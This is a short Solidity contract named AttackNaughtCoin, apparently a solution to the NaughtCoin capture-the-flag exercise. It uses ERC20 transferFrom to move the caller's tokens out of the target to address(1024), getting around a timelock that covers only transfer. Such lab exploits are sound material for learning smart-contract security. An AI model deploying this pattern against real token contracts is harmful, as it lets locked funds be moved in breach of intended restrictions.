// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

contract AttackNaughtCoin {
    IERC20 immutable private TARGET;

    constructor(address target){
        TARGET = IERC20(target);
    }

    function transferFromTarget(uint amount) external {
        TARGET.transferFrom(msg.sender, address(1024), amount);
    }
}
